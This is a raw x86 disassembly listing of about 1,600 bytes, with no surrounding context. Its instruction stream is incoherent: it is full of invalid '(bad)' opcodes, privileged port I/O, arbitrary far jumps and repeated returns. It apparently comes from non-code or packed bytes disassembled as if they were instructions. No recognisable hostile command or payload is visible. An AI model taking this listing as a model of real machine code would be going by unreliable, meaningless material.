  4103f7:	push   eax
  4103f8:	sub    dl,BYTE PTR ds:0xb58b8b1
  4103fe:	push   cs
  4103ff:	push   ecx
  410400:	sbb    DWORD PTR [edx+0x29],edi
  410403:	aam    0x86
  410405:	sub    al,0xd3
  410407:	sub    BYTE PTR [eax+0x23],al
  41040a:	rcr    BYTE PTR [esp+ecx*1],cl
  41040d:	push   es
  41040e:	rcr    ebx,1
  410410:	fisttp DWORD PTR [ebx]
  410412:	mov    edi,0x50f96fdf
  410417:	hlt    
  410418:	push   ecx
  410419:	push   ebx
  41041a:	inc    esp
  41041b:	mov    edi,0xcd582850
  410420:	cmp    BYTE PTR [ebx],al
  410422:	add    eax,DWORD PTR [ebx]
  410424:	(bad)  
  410425:	inc    eax
  410426:	call   0x8c05:0xa1481f4
  41042d:	lea    ecx,[ebp+0x14747461]
  410433:	mov    ecx,0x72e50e5c
  410438:	sbb    DWORD PTR [ebx],ecx
  41043a:	or     ecx,DWORD PTR [ebx]
  41043c:	ret    
  41043d:	ret    
  41043e:	ret    
  41043f:	ret    
  410440:	(bad)  
  410441:	ds aaa 
  410443:	aaa    
  410444:	pop    ss
  410445:	stos   DWORD PTR es:[edi],eax
  410446:	push   esp
  410447:	sub    al,BYTE PTR [ebp-0x60]
  41044a:	sub    DWORD PTR [ebp-0x49],ebx
  41044d:	or     al,0xa0
  41044f:	(bad)  
  410451:	fistp  QWORD PTR [edi-0xa01416]
  410457:	cli    
  410458:	std    
  410459:	mov    ebx,0x72feef77
  41045e:	ja     0x4104d7
  410460:	mov    bh,0xdb
  410462:	out    dx,eax
  410463:	test   ebx,0x7159f3e7
  410469:	add    ebp,edx
  41046b:	call   0x69d3:0xa4ffa34a
  410472:	arpl   WORD PTR [eax+0x78],di
  410475:	clc    
  410476:	fdivr  st,st(3)
  410478:	out    dx,eax
  410479:	mov    edi,0x6a6a607f
  41047e:	push   0xffffffcc
  410480:	xor    al,0x4d
  410482:	or     eax,0x445d8d0d
  410487:	inc    ebx
  410488:	shr    ebx,cl
  41048a:	pop    eax
  41048b:	dec    edx
  41048c:	add    ah,bl
  41048e:	add    eax,0x91001190
  410493:	inc    eax
  410494:	popa   
  410495:	int    0x9a
  410497:	xor    eax,0xfa3e8fdd
  41049c:	call   0xd33b63b4
  4104a1:	xchg   edi,eax
  4104a2:	mov    esi,0xc34dc007
  4104a7:	test   BYTE PTR [ecx],dl
  4104a9:	in     al,dx
  4104aa:	and    dl,dl
  4104ac:	sbb    al,0xe2
  4104ae:	(bad)  
  4104af:	sub    ebp,esi
  4104b1:	outs   dx,DWORD PTR ds:[esi]
  4104b2:	inc    edi
  4104b3:	add    al,0xb2
  4104b5:	jge    0x41048b
  4104b7:	pushf  
  4104b8:	out    0x72,eax
  4104ba:	mov    ecx,0x65d5d5d0
  4104bf:	xchg   ebp,eax
  4104c0:	mov    ds:0x97e98591,eax
  4104c5:	imul   eax,DWORD PTR [edx-0x56],0x3
  4104c9:	scas   eax,DWORD PTR es:[edi]
  4104ca:	mov    bh,0xb8
  4104cc:	dec    ebp
  4104cd:	scas   al,BYTE PTR es:[edi]
  4104ce:	or     ebp,0x4c
  4104d1:	cmp    cl,BYTE PTR [ebp-0x5c]
  4104d4:	inc    ecx
  4104d5:	dec    edx
  4104d6:	inc    ecx
  4104d7:	xlat   BYTE PTR ds:[ebx]
  4104d8:	jne    0x4104a6
  4104da:	int    0xcd
  4104dc:	popa   
  4104dd:	jbe    0x410555
  4104df:	(bad)  
  4104e0:	dec    edx
  4104e1:	fsub   DWORD PTR [ecx]
  4104e3:	and    DWORD PTR [edi+edx*8],esp
  4104e6:	jno    0x4104bd
  4104e8:	stos   BYTE PTR es:[edi],al
  4104e9:	push   ebp
  4104ea:	pop    eax
  4104eb:	mov    bl,0x66
  4104ed:	dec    ebp
  4104ee:	lods   eax,DWORD PTR ds:[esi]
  4104ef:	stc    
  4104f0:	scas   eax,DWORD PTR es:[edi]
  4104f1:	adc    dh,BYTE PTR ds:[ebx]
  4104f4:	add    eax,0x84fe6927
  4104f9:	bound  esi,QWORD PTR [ecx-0x2afcee98]
  4104ff:	push   edi
  410500:	pushf  
  410501:	popf   
  410502:	call   0x2fd0:0x91947bf
  410509:	pop    ecx
  41050a:	sub    DWORD PTR [edi+ebp*4+0x7c],esi
  41050e:	ds pop edi
  410510:	jns    0x4104fb
  410512:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410513:	xchg   edi,eax
  410514:	sahf   
  410515:	pushf  
  410516:	sahf   
  410517:	sahf   
  410518:	into   
  410519:	mov    eax,ds:0x145c25d6
  41051e:	jle    0x410539
  410520:	add    DWORD PTR [ecx+edx*8+0x8],edx
  410524:	add    BYTE PTR [ebx],al
  410526:	int    0x96
  410528:	loop   0x410551
  41052a:	and    al,BYTE PTR [edx+0x3d401095]
  410530:	jp     0x4104df
  410532:	sub    BYTE PTR ds:0xa00b26c1,dh
  410538:	(bad)  
  410539:	jb     0x4104e5
  41053b:	jmp    0x410582
  41053d:	and    al,0x93
  41053f:	xor    ebp,DWORD PTR [eax-0x73cf35ac]
  410545:	or     dl,BYTE PTR [ebp+edx*2-0x7b]
  410549:	popa   
  41054a:	push   esp
  41054b:	lods   al,BYTE PTR ds:[esi]
  41054c:	and    BYTE PTR [eax],ah
  41054e:	std    
  41054f:	dec    ecx
  410550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410551:	add    eax,0xac4847f8
  410556:	dec    edi
  410557:	inc    ecx
  410558:	lahf   
  410559:	inc    eax
  41055a:	and    BYTE PTR [eax-0x5b5d703c],dh
  410560:	sbb    al,0x1a
  410562:	pop    eax
  410563:	xchg   ecx,eax
  410564:	mov    dl,0xfb
  410566:	inc    edx
  410567:	mov    eax,ds:0x90c7d350
  41056c:	retf   
  41056d:	in     eax,0x30
  41056f:	cmp    DWORD PTR [ecx],edi
  410571:	mov    ecx,ecx
  410573:	leave  
  410574:	dec    ecx
  410575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410576:	shr    DWORD PTR [ecx+0x54],cl
  410579:	sub    dl,BYTE PTR ds:0xe9d9b364
  41057f:	push   0xc8c1fa34
  410584:	enter  0x7c8,0xba
  410588:	scas   al,BYTE PTR es:[edi]
  410589:	push   ebx
  41058a:	jbe    0x41052a
  41058c:	jge    0xee2b61a9
  410592:	in     eax,dx
  410593:	in     eax,dx
  410594:	fnstcw WORD PTR [ebx-0x10681089]
  41059a:	mov    ebx,0xd73bbeef
  41059f:	scas   al,BYTE PTR es:[edi]
  4105a0:	pop    ebp
  4105a1:	sbb    esp,DWORD PTR [ecx]
  4105a3:	pop    edi
  4105a4:	int    0xeb
  4105a6:	cmc    
  4105a7:	mov    ds:0x5b232e5c,al
  4105ac:	pop    ds
  4105ad:	and    ebx,DWORD PTR fs:[ebx+0x7f1d5acd]
  4105b4:	out    0xe7,al
  4105b6:	out    0xa7,eax
  4105b8:	fidivr WORD PTR [ebx+esi*8-0x33]
  4105bc:	pop    edi
  4105bd:	lea    ecx,[esp+ecx*4-0x6aa85564]
  4105c4:	add    al,0x96
  4105c6:	or     edi,DWORD PTR ds:0xc9b7175f
  4105cc:	add    eax,0x594166a0
  4105d1:	xchg   ebx,eax
  4105d2:	pusha  
  4105d3:	jno    0x4105a4
  4105d5:	sahf   
  4105d6:	cmp    eax,0xe8fa3d77
  4105db:	mov    ds:0xb55aac2f,eax
  4105e0:	jmp    0x50ae:0x439c940b
  4105e7:	sub    ebp,ebp
  4105e9:	or     dh,BYTE PTR cs:[edi+edi*2]
  4105ed:	fbld   TBYTE PTR [edx+0x45d72f60]
  4105f3:	push   0xc4886965
  4105f8:	loopne 0x4105ed
  4105fa:	stc    
  4105fb:	lods   al,BYTE PTR ds:[esi]
  4105fc:	call   FWORD PTR [ebp+0x2e5ca088]
  410602:	mov    ds:0x54a02850,eax
  410607:	sub    bl,BYTE PTR [ecx-0x3d]
  41060a:	ret    
  41060b:	mov    DWORD PTR [edx],ecx
  41060d:	adc    DWORD PTR [ebx-0x145e8d40],0x9f3e7c3a
  410617:	aad    0xe7
  410619:	test   BYTE PTR [ebx+0x4152a54a],dl
  41061f:	cmp    bl,BYTE PTR [ebp+0x2c2c2c6]
  410625:	mov    dh,0xc6
  410628:	jmp    0xdddd:0xd1079c43
  41062f:	lea    edi,[esi-0x90bc142]
  410635:	neg    BYTE PTR [edx+0x4d]
  410638:	mov    eax,0x569d9d9d
  41063d:	ins    BYTE PTR es:[edi],dx
  41063e:	xor    BYTE PTR [edx+0x40],0x4a
  410642:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410643:	xchg   edx,eax
  410644:	xor    eax,0x7e170fa2
  410649:	icebp  
  41064a:	cmp    edx,DWORD PTR [esi-0x14287bef]
  410650:	mov    ch,0x5c
  410652:	push   ecx
  410653:	mov    bh,0xdb
  410655:	lea    esp,[ebx-0x90170b9]
  41065b:	popf   
  41065c:	ja     0x41063c
  41065e:	jns    0x41066f
  410660:	inc    eax
  410661:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410662:	pop    esi
  410663:	jne    0x410663
  410665:	mov    edi,0x75f39093
  41066a:	dec    edx
  41066b:	fst    DWORD PTR [esi+0x4b027565]
  410671:	arpl   WORD PTR [esi],ax
  410673:	sub    eax,edx
  410675:	dec    edx
  410676:	adc    al,BYTE PTR [ecx-0x5517fe1a]
  41067c:	stos   BYTE PTR es:[edi],al
  41067d:	clc    
  41067e:	or     al,0xa3
  410680:	bound  esi,QWORD PTR [ecx+0x57fdef23]
  410686:	sub    ah,ch
  410688:	popa   
  410689:	call   0x7340:0x2b7ad5
  410690:	or     BYTE PTR [edx+0x64c99cdf],dl
  410696:	push   0x35
  410698:	gs jg  0x410655
  41069b:	stos   BYTE PTR es:[edi],al
  41069c:	stos   BYTE PTR es:[edi],al
  41069d:	(bad)  
  41069e:	xor    BYTE PTR [edx+0x64],bl
  4106a1:	inc    esi
  4106a2:	adc    ch,BYTE PTR [eax]
  4106a4:	imul   ebp,DWORD PTR [edi],0xffffff99
  4106a7:	dec    esp
  4106a8:	pop    edx
  4106a9:	leave  
  4106aa:	adc    al,0xa1
  4106ac:	push   eax
  4106ad:	or     BYTE PTR [ebx],al
  4106af:	add    eax,DWORD PTR [ebx]
  4106b1:	dec    ebp
  4106b2:	or     BYTE PTR [edi],0xd4
  4106b5:	sbb    BYTE PTR ds:[eax+0x2c],0x86
  4106ba:	jae    0x4106a3
  4106bc:	into   
  4106bd:	and    DWORD PTR [ebx-0x282caf37],edx
  4106c3:	inc    edx
  4106c4:	xor    al,0x1a
  4106c6:	cmp    eax,0xa5d2e97c
  4106cb:	ud2    
  4106cd:	test   DWORD PTR [edx+0xe],eax
  4106d0:	lea    ebp,[esi]
  4106d2:	mov    ecx,0xba670cd4
  4106d7:	(bad)  [esi-0x21]
  4106da:	imul   ch
  4106dc:	fld    TBYTE PTR [edi-0x4]
  4106df:	into   
  4106e0:	ja     0x4106a0
  4106e2:	repz cmc 
  4106e4:	sbb    ebp,DWORD PTR [esi-0x48]
  4106e7:	popa   
  4106e8:	xor    eax,0x142604d
  4106ed:	and    edx,esi
  4106ef:	scas   eax,DWORD PTR es:[edi]
  4106f0:	dec    ecx
  4106f1:	jmp    0x4106c2
  4106f3:	iret   
  4106f4:	iret   
  4106f5:	arpl   WORD PTR [esi+0x66],sp
  4106f8:	data16 div ah
  4106fb:	jmp    0xf4c0b6d3
  410700:	rol    DWORD PTR [edi-0x39],1
  410703:	repnz stc 
  410705:	cld    
  410706:	and    bl,BYTE PTR [eax+0x53]
  410709:	sbb    al,0x9a
  41070b:	jge    0x410788
  41070d:	(bad)  
  41070f:	dec    ebx
  410710:	add    eax,0x917ffd4b
  410715:	add    BYTE PTR [edx+edi*1],dl
  410718:	jle    0x410719
  41071a:	std    
  41071b:	neg    edi
  41071d:	repz clc 
  41071f:	jecxz  0x4106b0
  410721:	mov    edi,0xbb972e5a
  410726:	retf   
  410727:	in     eax,0xf2
  410729:	xchg   edx,eax
  41072a:	adc    DWORD PTR [edx+0x75c57eed],eax
  410730:	jno    0x410751
  410732:	pop    ss
  410733:	and    al,BYTE PTR cs:[esi+ecx*2]
  410737:	rcr    ah,cl
  410739:	mov    WORD PTR [edi],ss
  41073b:	test   esi,ebx
  41073d:	cs mov dh,0x60
  410740:	inc    edi
  410741:	adc    al,0x94
  410743:	sbb    BYTE PTR [esp+eiz*4+0x15],al
  410747:	mov    DWORD PTR [esp+ebp*1-0xd],eax
  41074b:	fwait
  41074c:	call   0x5ff7:0xe73fc94a
  410753:	add    DWORD PTR cs:[eax+0x142851eb],edx
  41075a:	lods   al,BYTE PTR ds:[esi]
  41075b:	add    DWORD PTR [eax+edi*2-0x75],ebx
  41075f:	add    ebp,DWORD PTR ds:0x4d34589c
  410765:	inc    ebx
  410766:	cs xchg edi,eax
  410768:	inc    ebx
  410769:	sub    al,0x16
  41076b:	mov    bl,0xc6
  41076d:	jp     0x41075b
  41076f:	jmp    0x41075c
  410771:	inc    ebx
  410772:	cmp    BYTE PTR [esi+eax*2],bl
  410775:	sub    BYTE PTR [edx+eax*2],dl
  410778:	xor    BYTE PTR [eax],bl
  41077a:	inc    esp
  41077b:	and    BYTE PTR [eax],dl
  41077d:	mov    al,0xd2
  41077f:	(bad)  
  410780:	sub    esi,ebx
  410782:	les    ebx,FWORD PTR [ebx+0x20962977]
  410788:	ds stos DWORD PTR es:[edi],eax
  41078a:	dec    eax
  41078b:	pop    esi
  41078c:	xor    al,0xb2
  41078e:	jae    0x4107ba
  410790:	xchg   ebp,eax
  410791:	ret    0xfdfe
  410794:	sti    
  410795:	jmp    FWORD PTR [edi-0x5b]
  410798:	push   edx
  410799:	jno    0x41073c
  41079b:	adc    DWORD PTR [eax+0x26],esp
  41079e:	mov    eax,ds:0xb65c8516
  4107a3:	cs xchg edx,eax
  4107a5:	add    eax,edx
  4107a7:	dec    esp
  4107a8:	push   es
  4107a9:	ror    BYTE PTR [edx],0x89
  4107ac:	pusha  
  4107ad:	fld    DWORD PTR [eax+eiz*2]
  4107b0:	sbb    BYTE PTR [esi-0x54a952af],al
  4107b6:	and    BYTE PTR [edx+0x31],0xa4
  4107ba:	popa   
  4107bb:	push   esp
  4107bc:	jmp    0xed4f:0x1f4d1bda
  4107c3:	test   ebp,edx
  4107c5:	rol    BYTE PTR [eax-0x46505337],cl
  4107cb:	or     DWORD PTR ds:0x2ba8a7c6,ecx
  4107d1:	stc    
  4107d2:	inc    esi
  4107d3:	mov    esp,0xdd469f0d
  4107d8:	leave  
  4107d9:	xlat   BYTE PTR ds:[ebx]
  4107da:	sti    
  4107db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107dc:	push   ebx
  4107dd:	scas   eax,DWORD PTR es:[edi]
  4107de:	cmp    al,0x8a
  4107e0:	or     DWORD PTR [eax+0x56ad5539],edx
  4107e6:	sub    eax,0x48913edf
  4107eb:	and    BYTE PTR [edi+0x2c58a1cb],dl
  4107f1:	push   0xfffffff1
  4107f3:	js     0x4107f1
  4107f5:	je     0x410819
  4107f7:	xchg   ecx,eax
  4107f8:	sbb    BYTE PTR [edi+0x58],bl
  4107fb:	pop    eax
  4107fc:	cwde   
  4107fd:	aam    0x34
  4107ff:	sub    eax,0x7e09a85
  410804:	rcl    DWORD PTR [eax],1
  410806:	jl     0x410885
  410808:	fnstsw WORD PTR [edx-0x941e48b]
  41080e:	mov    ch,0xaf
  410810:	jge    0x41080b
  410812:	(bad)  
  410813:	sbb    ebp,DWORD PTR [edi-0x24]
  410816:	mov    al,0x79
  410818:	repz out 0x35,al
  41081b:	popf   
  41081c:	popf   
  41081d:	popf   
  41081e:	xchg   esi,eax
  41081f:	fstp   DWORD PTR [eax-0x49]
  410822:	sbb    dl,BYTE PTR [eax+0x2c]
  410825:	push   ss
  410826:	mov    cl,0xb8
  410828:	mov    eax,0x59d9d988
  41082d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41082e:	shr    ecx,cl
  410830:	jmp    0x3f8f:0x89e8e8e8
  410837:	(bad)  
  410838:	clc    
  410839:	std    
  41083a:	mov    DWORD PTR [ecx-0x60cf077],ecx
  410840:	cld    
  410841:	add    bl,BYTE PTR [edx]
  410843:	mov    esi,0x316c1739
  410848:	rol    bh,1
  41084a:	test   DWORD PTR [ebp-0x132e8184],ebx
  410850:	out    0xc2,eax
  410852:	pop    edi
  410853:	add    eax,0x6db6d950
  410858:	fwait
  410859:	out    dx,eax
  41085a:	mov    eax,ds:0xf27a1e87
  41085f:	out    dx,al
  410860:	mov    ebx,0x5d47feef
  410865:	xlat   BYTE PTR ds:[ebx]
  410866:	mov    ebx,0x256a92c9
  41086b:	cld    
  41086c:	sbb    al,0x76
  41086e:	inc    esp
  41086f:	and    BYTE PTR [ebx],bh
  410871:	xchg   edi,eax
  410872:	cvtps2pd xmm1,xmm2
  410875:	popa   
  410876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410877:	icebp  
  410878:	mov    ecx,0xb3615f99
  41087d:	and    DWORD PTR [ecx+0x64170596],ecx
  410883:	push   ecx
  410884:	dec    eax
  410885:	fsubr  QWORD PTR [esi+0x37]
  410888:	cld    
  410889:	(bad)  
  41088a:	fisub  DWORD PTR [eax-0x2fbd2360]
  410890:	jmp    0x410823
  410892:	cld    
  410893:	push   edx
  410894:	test   eax,0x672e5c84
  410899:	or     DWORD PTR [edx-0x184d1308],ebx
  41089f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108a0:	rcr    DWORD PTR [eax+0x49],0x91
  4108a4:	enter  0x9116,0xc
  4108a8:	call   0xac9d62e8
  4108ad:	gs in  eax,0x26
  4108b0:	xchg   ebx,eax
  4108b1:	dec    ecx
  4108b2:	jmp    0x4108ef
  4108b4:	and    BYTE PTR [ebx],cl
  4108b6:	shr    bh,1
  4108b8:	mul    DWORD PTR [ebx]
  4108ba:	xchg   ebx,eax
  4108bb:	leave  
  4108bc:	or     al,0xb9
  4108be:	fucomp st(6)
  4108c0:	mov    ecx,0xdfd7ebf5
  4108c5:	mov    dh,0x76
  4108c7:	in     eax,dx
  4108c8:	fisubr DWORD PTR [esi-0x61]
  4108cb:	iret   
  4108cc:	out    0x2a,eax
  4108ce:	adc    al,0xa
  4108d0:	shl    BYTE PTR [ebp-0x23],1
  4108d3:	pop    edx
  4108d4:	sub    al,ch
  4108d6:	dec    eax
  4108d7:	out    dx,al
  4108d8:	inc    ebx
  4108d9:	and    BYTE PTR [eax],dl
  4108db:	mov    al,0xac
  4108dd:	xchg   edx,eax
  4108de:	push   0xe7f97a34
  4108e3:	aas    
  4108e4:	(bad)  
  4108e5:	stc    
  4108e6:	mov    bl,0xa7
  4108e8:	dec    esi
  4108e9:	popf   
  4108ea:	cmp    cl,BYTE PTR [esi+0x26e7f686]
  4108f0:	ds ja  0x4108f4
  4108f3:	(bad)  
  4108f4:	cmc    
  4108f5:	push   esi
  4108f6:	out    dx,al
  4108f7:	sub    DWORD PTR [edx],0xddae8f39
  4108fd:	push   ss
  4108fe:	retf   
  4108ff:	or     BYTE PTR es:[ebx-0x2231d0e9],0x72
  410907:	retf   
  410908:	sub    eax,0xf2e5cbba
  41090d:	push   ebx
  41090e:	and    al,0xd5
  410910:	xor    al,0xd
  410912:	aam    0x9a
  410914:	retf   0xda6b
  410917:	sahf   
  410918:	pop    es
  410919:	add    eax,0xb65f026b
  41091e:	bound  eax,QWORD PTR [eax]
  410920:	cld    
  410921:	inc    ebx
  410922:	icebp  
  410923:	aam    0x13
  410925:	xor    ah,al
  410927:	pop    esi
  410928:	jns    0x4108ef
  41092a:	(bad)  
  41092c:	mov    ah,BYTE PTR [ebx+ebx*1+0x30608186]
  410933:	mov    BYTE PTR [ecx+0x75740181],al
  410939:	jne    0x4108fc
  41093b:	jmp    0x410932
  41093d:	pop    edx
  41093e:	les    eax,FWORD PTR [ecx+0x6d]
  410941:	(bad)  
  410942:	xchg   ebx,eax
  410943:	xchg   ebx,eax
  410944:	xchg   ebx,eax
  410945:	mov    ch,al
  410947:	(bad)  
  410948:	aam    0xde
  41094a:	pop    ebp
  41094b:	leave  
  41094c:	out    0xf3,eax
  41094e:	pop    ss
  41094f:	xchg   DWORD PTR [esi+0x264cde86],eax
  410955:	xchg   ebx,eax
  410956:	xchg   ebx,eax
  410957:	test   al,0x9
  410959:	daa    
  41095a:	cmc    
  41095b:	xchg   DWORD PTR [edi+0x7777a697],esp
  410961:	ja     0x41095a
  410963:	fdiv   QWORD PTR [edi-0x21]
  410966:	jge    0x4109df
  410968:	cmp    al,0xf4
  41096a:	rol    BYTE PTR [ebx+0x77],1
  41096d:	outs   dx,BYTE PTR ds:[esi]
  41096e:	fdivr  QWORD PTR [eax-0x5dc1bbcf]
  410974:	(bad)  
  410975:	jecxz  0x410928
  410977:	es cli 
  410979:	sub    BYTE PTR [edx+ecx*1],dl
  41097c:	push   esi
  41097d:	loopne 0x4109af
  41097f:	popf   
  410980:	dec    esi
  410981:	arpl   WORD PTR [esp+esi*2+0x74],si
  410985:	call   0xafd4d36e
  41098a:	mov    WORD PTR [edi+0x3511ff8f],cs
  410990:	mov    edi,0x88b8989e
  410995:	lods   ax,WORD PTR ds:[esi]
  410997:	iret   
  410998:	or     DWORD PTR [eax-0x2c],eax
  41099b:	hlt    
  41099c:	mov    ah,0x90
  41099e:	ror    BYTE PTR [ebx-0x6029bfb7],0xbb
  4109a5:	arpl   di,ax
  4109a7:	mov    es,eax
  4109a9:	push   ebx
  4109aa:	dec    edi
  4109ab:	cmp    eax,0x3d3daff5
  4109b0:	cmp    eax,0x5a69a37f
  4109b5:	sar    DWORD PTR [edi+eax*1+0x2b7f34ed],cl
  4109bc:	or     esp,DWORD PTR [eax+0x39]
  4109bf:	out    0x88,eax
  4109c1:	in     eax,0x85
  4109c3:	imul   ebp,DWORD PTR [esi+edx*4-0x17db4408],0x92269cd4
  4109ce:	add    bl,BYTE PTR [ecx+0x12]
  4109d1:	mov    esp,0x6090b8bc
  4109d6:	jp     0x410995
  4109d8:	faddp  st(6),st
  4109da:	cld    
  4109db:	or     dh,BYTE PTR [ebp+0x52]
  4109de:	enter  0x72e5,0xd0
  4109e2:	xor    al,0xcd
  4109e4:	pop    edx
  4109e5:	dec    eax
  4109e6:	mov    DWORD PTR [eax-0x48ab1413],ecx
  4109ec:	inc    edx
  4109ed:	mov    eax,ds:0xedf54560
  4109f2:	or     BYTE PTR [eax+0x8d03af],al
  4109f8:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4109fa:	push   edx
  4109fb:	mov    cl,0x12
  4109fd:	sub    DWORD PTR [edx-0x4f],0xffffffae
  410a01:	xor    dh,BYTE PTR [edi+0x2d]
  410a04:	cmp    ebx,DWORD PTR [edi+0x78]
  410a07:	loope  0x41098e
  410a09:	push   DWORD PTR [esi]
  410a0b:	xor    eax,0xf7bc9535
  410a10:	fidivr WORD PTR [ebx-0x49]
  410a13:	in     eax,dx
  410a14:	fdiv   DWORD PTR [ecx-0x4110501d]
  410a1a:	sti    
  410a1b:	out    dx,al
  410a1c:	ins    DWORD PTR es:[edi],dx
  410a1d:	add    eax,DWORD PTR [ebx]
  410a1f:	add    ebx,DWORD PTR [ebx-0x5]
  410a22:	sti    
  410a23:	sti    
  410a24:	pop    es
  410a25:	inc    edx
  410a26:	mov    eax,ds:0x8c088790
  410a2b:	xor    al,BYTE PTR [ecx+0x23]
  410a2e:	cmc    
  410a2f:	out    0xc6,al
  410a31:	mov    DWORD PTR [ecx+0x2f8bec89],ecx
  410a37:	mov    esi,0x87c3fdf8
  410a3c:	movsx  ecx,WORD PTR [ecx-0x4d8c0f66]
  410a43:	xchg   edi,eax
  410a44:	cdq    
  410a45:	std    
  410a46:	xor    dh,BYTE PTR [edx]
  410a48:	loopne 0x4109cc
  410a4a:	scas   al,BYTE PTR es:[edi]
  410a4b:	mov    al,0xf2
  410a4d:	je     0x4109eb
  410a4f:	xchg   esp,eax
  410a50:	or     BYTE PTR [edi-0x3f6d25e6],dh
  410a56:	dec    edx
  410a57:	sub    al,0x0
  410a59:	mov    bl,0xd9
  410a5b:	xchg   DWORD PTR [eax+eax*2],esi
  410a5e:	in     eax,dx
  410a5f:	(bad)  
  410a60:	cmc    
  410a61:	iret   
  410a62:	add    ebp,ecx
  410a64:	add    eax,DWORD PTR [edx-0x12b715cc]
  410a6a:	lock jl 0x410ad3
  410a6d:	push   esp
  410a6e:	rcr    BYTE PTR [eax],cl
  410a70:	hlt    
  410a71:	xchg   edx,eax
  410a72:	imul   ecx,DWORD PTR [edi*1-0x1280b8e6],0xeee8b5da
  410a7d:	out    dx,al
  410a7e:	outs   dx,BYTE PTR ds:[esi]
  410a7f:	sbb    dh,BYTE PTR [edx+eiz*4+0x3e]
  410a83:	mov    al,ds:0x3f9fce26
  410a88:	(bad)
  410a8c:	inc    edx
  410a8d:	mov    eax,ds:0xfe5c7f40
  410a92:	ret    0xb85
  410a95:	scas   eax,DWORD PTR es:[edi]
  410a96:	dec    edi
  410a97:	dec    esi
  410a98:	dec    esi
  410a99:	sahf   
  410a9a:	inc    esi
  410a9b:	dec    ebp
  410a9c:	sub    BYTE PTR ds:0x90cc2468,bh
  410aa2:	xchg   dh,dh
  410aa4:	in     al,dx
  410aa5:	fnstsw WORD PTR [ebx-0x7205409]
  410aab:	(bad)  
  410aac:	aaa    
  410aad:	out    dx,al
  410aae:	mov    ecx,0x22ebbaee
  410ab3:	in     al,0x9b
  410ab5:	xchg   ecx,eax
  410ab6:	lahf   
  410ab7:	dec    edx
  410ab8:	sbb    BYTE PTR [edi+0x3731e7cf],0x37
  410abf:	xchg   DWORD PTR [ecx+0x122429a9],ebp
  410ac5:	mov    esp,eax
  410ac7:	mov    ecx,0x777ee773
  410acc:	jmp    0x3ea8:0xf503a9d4
  410ad3:	xor    eax,0x2f2d71cd
  410ad8:	adc    al,BYTE PTR [eax]
  410ada:	sub    eax,0x66a5fb06
  410adf:	inc    ebp
  410ae0:	pop    edx
  410ae1:	pop    ss
  410ae2:	xchg   ebx,eax
  410ae3:	jg     0x410b5d
  410ae5:	fs mov bh,0xfa
  410ae8:	enter  0x8f23,0x3c
  410aec:	fst    st(5)
  410aee:	aad    0xf5
  410af0:	aaa    
  410af1:	xor    al,0x93
  410af3:	or     al,0x60
  410af5:	das    
  410af6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410af7:	jbe    0x410b09
  410af9:	mov    DWORD PTR [eax+0x25],esp
  410afc:	inc    edx
  410afd:	das    
  410afe:	sahf   
  410aff:	ret    
  410b00:	and    ebx,esi
  410b02:	xlat   BYTE PTR ds:[ebx]
  410b03:	sub    eax,edi
  410b05:	dec    edx
  410b06:	and    esp,DWORD PTR [esi]
  410b08:	jae    0x410af5
  410b0a:	cmp    ah,0x7e
  410b0d:	jmp    0xaddc:0x2476460
  410b14:	mov    al,ds:0xe3c79138
  410b19:	inc    ecx
  410b1a:	ja     0x410b93
  410b1c:	aaa    
  410b1d:	mov    edx,0xa951bbbb
  410b22:	push   esp
  410b23:	lods   al,BYTE PTR ds:[esi]
  410b24:	les    ebx,FWORD PTR ds:0xb029df32
  410b2a:	sub    BYTE PTR [edx+0x16e97523],dl
  410b30:	arpl   WORD PTR [ecx],ax
  410b32:	mov    dl,0x67
  410b34:	mov    ds:0xc677d3ba,eax
  410b39:	jmp    0x410afc
  410b3b:	int    0xf9
  410b3d:	(bad)  
  410b3f:	fimul  WORD PTR ds:0x77eefddf
  410b45:	jmp    FWORD PTR [ecx-0x21]
  410b48:	mov    esi,0x703fdf7d
  410b4d:	loopne 0x410b0f
  410b4f:	pop    ds
  410b50:	push   cs
  410b51:	sbb    al,0x38
  410b53:	jo     0x410b47
  410b55:	lds    edx,FWORD PTR [edi]
  410b57:	pop    edi
  410b58:	hlt    
  410b59:	cli    
  410b5a:	std    
  410b5b:	(bad)  
  410b5c:	loopne 0x410b4b
  410b5e:	mov    bh,0xdf
  410b60:	jle    0x410b3f
  410b62:	imul   ch
  410b64:	fld    TBYTE PTR [edi-0x41]
  410b67:	repz into 
  410b69:	cmp    esi,DWORD PTR [edi-0x6432194]
  410b6f:	cli    
  410b70:	xor    eax,0x3f5cd66b
  410b75:	cmp    BYTE PTR [eax],bh
  410b77:	call   0x275458b1
  410b7c:	dec    edi
  410b7d:	sahf   
  410b7e:	int3   
  410b7f:	in     al,dx
  410b80:	(bad)  [edi-0x7038f811]
  410b86:	pop    ds
  410b87:	aas    
  410b88:	add    ah,BYTE PTR [eax+0x44dafea7]
  410b8e:	loop   0x410b77
  410b90:	inc    edx
  410b91:	or     esi,DWORD PTR [esp+eax*1]
  410b94:	pop    ecx
  410b95:	adc    DWORD PTR [esi+0x6201b93],ecx
  410b9b:	or     BYTE PTR [ecx+0x59cec1ac],ch
  410ba1:	push   esi
  410ba2:	imul   eax,ecx,0x4a
  410ba5:	bound  eax,QWORD PTR [eax]
  410ba7:	gs inc ebp
  410ba9:	push   ecx
  410baa:	ror    BYTE PTR [edx+0x436a44a2],cl
  410bb0:	jge    0x410bcb
  410bb2:	dec    ebp
  410bb3:	inc    ecx
  410bb4:	inc    eax
  410bb5:	out    dx,al
  410bb6:	xor    edx,edx
  410bb8:	dec    ebx
  410bb9:	sub    eax,DWORD PTR es:[ecx+0x43e9618]
  410bc0:	xor    al,bl
  410bc2:	push   0x3ebd5ae4
  410bc7:	out    dx,eax
  410bc8:	pop    esi
  410bc9:	inc    edi
  410bca:	inc    edi
  410bcb:	xchg   DWORD PTR ds:0xde452720,esi
  410bd1:	imul   ecx,DWORD PTR [eax-0x1b],0xf9893264
  410bd8:	stc    
  410bd9:	jns    0x410b9f
